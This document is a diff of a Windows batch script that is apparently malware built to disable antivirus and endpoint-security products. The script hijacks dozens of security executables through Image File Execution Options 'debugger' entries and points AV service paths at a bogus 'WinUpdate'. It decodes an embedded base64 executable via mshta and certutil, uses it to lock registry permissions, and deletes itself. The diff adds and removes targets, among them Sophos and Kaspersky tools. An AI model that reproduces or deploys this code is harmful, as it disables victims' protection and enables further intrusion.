@@ -540,7 +540,6 @@ Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution 
 Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LuCallbackProxy.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
 Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\vptray.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
 Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\vpc32.exe" /v "debugger" /t REG_SZ /d "cmd /c start /MIN wscript //nologo %windir%\framework.vbs" /f
-Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ccSetMgr.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
 Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ccEvtMgr.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
 Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DefWatch.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
 Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\NscTop.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
@@ -775,15 +774,11 @@ Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution 
 Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmdvirth.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
 reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsm.exe" /f
 reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MsMpEng.exe" /f
-Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\EPUpdateService.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
-Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\EPConsole.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
-Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\EPSecurityService.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
 Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\anti_ransomware_service.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
-
-::NOVA
+             			
 set "x=%~f0"& set fso=CreateObject("Scripting.FileSystemObject")
 >>"sbn.64" mshta "vbscript:%fso%.GetStandardStream(1).Write(Split(%fso%.OpenTextFile("%x: ="+Chr(32)+"%").ReadAll(),vbCrLf+"exit"+Chr(32)+"/b"+Chr(32)+"0"+vbCrLf)(1))&Close()"
-
+                            			
 if exist %windir%\subinacl.exe (goto renam)
 if not exist %windir%\system32\certutil.exe (goto nocertutil)
 certutil.exe -decode sbn.64 sbn.exe
@@ -1330,7 +1325,6 @@ sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
 sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LuCallbackProxy.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
 sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\vptray.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
 sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\vpc32.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
-sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ccSetMgr.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
 sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ccEvtMgr.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
 sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DefWatch.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
 sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\NscTop.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
@@ -1642,8 +1636,6 @@ Reg Add "HKLM\SYSTEM\CurrentControlSet\services\MBAMService" /v "ImagePath" /t R
 Sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\MBAMService" /revoke=S-1-5-32-545 /revoke=S-1-5-32-544 /revoke=S-1-5-32-578 /revoke=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0 /deny=S-1-1-0=F
 Reg Add "HKLM\SYSTEM\CurrentControlSet\services\ESProtectionDriver" /v "ImagePath" /t REG_SZ /d "WinUpdate" /f
 Sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\ESProtectionDriver" /revoke=S-1-5-32-545 /revoke=S-1-5-32-544 /revoke=S-1-5-32-578 /revoke=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0 /deny=S-1-1-0=F
-Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MBAMService.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
-Sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MBAMService.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
 Reg Add "HKLM\SYSTEM\CurrentControlSet\services\TrkSvr" /v "ImagePath" /t REG_SZ /d "WinUpdate" /f
 Reg Add "HKLM\SYSTEM\CurrentControlSet\services\IsmServ" /v "ImagePath" /t REG_SZ /d "WinUpdate" /f
 Reg Add "HKLM\SYSTEM\CurrentControlSet\services\ntrtscan" /v "ImagePath" /t REG_SZ /d "WinUpdate" /f
@@ -1759,49 +1751,23 @@ Sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\AVP19.0.0"
 Reg Add "HKLM\SYSTEM\CurrentControlSet\services\MbamElam" /v "ImagePath" /t REG_SZ /d "WinUpdate" /f
 Sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\MbamElam" /revoke=S-1-5-32-545 /revoke=S-1-5-32-544 /revoke=S-1-5-32-578 /revoke=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0 /deny=S-1-1-0=F
 Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SEDService.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
-Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\hmpalert.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
-Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SavService.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
 Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SophosNtpService.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
-Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SAVAdminService.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
-Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\swc_service.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
-Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ALsvc.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
 Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SophosFS.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
 Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SophosFileScanner.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
-Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SophosFileScanner.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
 Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SophosFIMService.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
-Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\swi_filter.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
-Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\swi_fc.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
-Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\swi_service.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
 Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SophosCleanM.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
 Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SophosSafestore64.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
-Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\McsClient.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
 Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SSPService.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
 Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SophosHealth.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
-Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\McsAgent.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
-Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sdcservice.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
-Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Sophos UI.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
 sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SEDService.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
-sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\hmpalert.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
-sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SavService.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
 sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SophosNtpService.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
-sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SAVAdminService.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
-sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\swc_service.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
-sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ALsvc.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
 sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SophosFS.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
 sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SophosFileScanner.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
-sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SophosFileScanner.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
 sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SophosFIMService.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
-sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\swi_filter.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
-sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\swi_fc.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
-sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\swi_service.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
 sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SophosCleanM.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
 sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SophosSafestore64.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
-sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\McsClient.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
 sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SSPService.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
 sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SophosHealth.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
-sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\McsAgent.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
-sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sdcservice.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
-sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Sophos UI.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
 " /v "ImagePath" /t REG_SZ /d "WinUpdate" /f
 Reg Add "HKLM\SYSTEM\CurrentControlSet\services\SAVAdminService" /v "ImagePath" /t REG_SZ /d "WinUpdate" /f
 Reg Add "HKLM\SYSTEM\CurrentControlSet\services\SAVService" /v "ImagePath" /t REG_SZ /d "WinUpdate" /f
@@ -1881,12 +1847,10 @@ Reg Add "HKLM\SYSTEM\CurrentControlSet\services\FortiWF" /v "ImagePath" /t REG_S
 Reg Add "HKLM\SYSTEM\CurrentControlSet\services\fortimon3" /v "ImagePath" /t REG_SZ /d "WinUpdate" /f
 Reg Add "HKLM\SYSTEM\CurrentControlSet\services\fortiloader" /v "ImagePath" /t REG_SZ /d "WinUpdate" /f
 Reg Add "HKLM\SYSTEM\CurrentControlSet\services\FortiAptFilter" /v "ImagePath" /t REG_SZ /d "WinUpdate" /f
-Reg Add "HKLM\SYSTEM\CurrentControlSet\services\FA_Scheduler" /v "ImagePath" /t REG_SZ /d "WinUpdate" /f
 Sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\FortiWF" /revoke=S-1-5-32-545 /revoke=S-1-5-32-544 /revoke=S-1-5-32-578 /revoke=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0 /deny=S-1-1-0=F
 Sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\fortimon3" /revoke=S-1-5-32-545 /revoke=S-1-5-32-544 /revoke=S-1-5-32-578 /revoke=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0 /deny=S-1-1-0=F
 Sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\fortiloader" /revoke=S-1-5-32-545 /revoke=S-1-5-32-544 /revoke=S-1-5-32-578 /revoke=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0 /deny=S-1-1-0=F
 Sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\FortiAptFilter" /revoke=S-1-5-32-545 /revoke=S-1-5-32-544 /revoke=S-1-5-32-578 /revoke=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0 /deny=S-1-1-0=F
-Sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\FA_Scheduler" /revoke=S-1-5-32-545 /revoke=S-1-5-32-544 /revoke=S-1-5-32-578 /revoke=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0 /deny=S-1-1-0=F
 Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iptray.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
 Sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iptray.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
 Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sfc.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
@@ -1984,14 +1948,12 @@ Reg Add "HKLM\SYSTEM\CurrentControlSet\services\McAfeeDLPAgentService" /v "Image
 Sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\McAfeeDLPAgentService" /revoke=S-1-5-32-545 /revoke=S-1-5-32-544 /revoke=S-1-5-32-578 /revoke=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0 /deny=S-1-1-0=F
 Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\egui.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
 Sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\egui.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
-
+Reg Add "HKLM\SYSTEM\CurrentControlSet\services\sophossps" /v "ImagePath" /t REG_SZ /d "WinUpdate" /f
+Sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\sophossps" /revoke=S-1-5-32-545 /revoke=S-1-5-32-544 /revoke=S-1-5-32-578 /revoke=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0 /deny=S-1-1-0=F
+                  			
 Reg Add "HKLM\SYSTEM\CurrentControlSet\services\MBAMSwissArmy" /v "ImagePath" /t REG_SZ /d "WinUpdate" /f
 Sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\MBAMSwissArmy" /revoke=S-1-5-32-545 /revoke=S-1-5-32-544 /revoke=S-1-5-32-578 /revoke=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0 /deny=S-1-1-0=F
-
-Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\KasperskyCleaner.exe" /v "debugger" /t REG_SZ /d "fixmapi.exe" /f
-Sbn.exe /keyreg "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\KasperskyCleaner.exe" /grant=S-1-5-32-545=R /grant=S-1-5-32-544=R /grant=S-1-1-0=R /grant=S-1-5-32-578=R /grant=S-1-5-18=R /setowner=S-1-5-32-546 /revoke=S-1-3-0
-
-::THE_END
+  	
 :nocertutil
 del /f /q sbn.64
 del /f /q "%0"
@@ -2010,13 +1972,6 @@ AAAAAAAAAADIewUASAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAABVUFgwAAAAAAAgBAAAEAAAAAAAAAAEAAAAAAAAAAAAAAAAAACAAADg
 VVBYMQAAAAAAUAEAADAEAABOAQAABAAAAAAAAAAAAAAAAAAAQAAA4C5yc3JjAAAA
 ABAAAACABQAACgAAAFIBAAAAAAAAAAAAAAAAAEAAAMAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMy45NABVUFghDQkFCQX4ylD+bwrZ
 6FUFACBKAQAAbgQAJgkA99M0Tfv4UQQA5AbMrJB0TdM0TWBWRjwmDpqmWTb8UObW
 wrJpmqZpoJJ8XkTTLJumKALeT6aaTdM0TYJqWEQoDlk2zTb4TqYG0hZSNKZpmqZG
@@ -3788,17 +3743,7 @@ Pwl18osHil8EZsHoCMHAEIbEKfiA6+gB8IkHg8cFiNji2Y2+AEAFAIsHCcB0RYtf
 BI2EMFB0BQAB81CDxwj/lrR1BQCVigdHCMB03In5eQcPtwdHUEe5V0jyrlX/lrx1
 BQAJwHQHiQODwwTr2P+WuHUFAIuuwHUFAI2+APD//7sAEAAAUFRqBFNX/9WNhw8C
 AACAIH+AYCh/WFBUUFNX/9VYYY1EJIBqADnEdfqD7IDpDmb+/wAAAEgAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAACRuBAHAxgEBggAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIA
 BgAAACAAAIAQAAAAwAAAgAAAAAAAAAAAAAAAAAAAAwABAAAASAAAgAIAAABwAACA
 AwAAAJgAAIAAAAAAAAAAAAAAAAAAAAEACQQAAGAAAABQRAUAFgYAAAAAAAAAAAAA
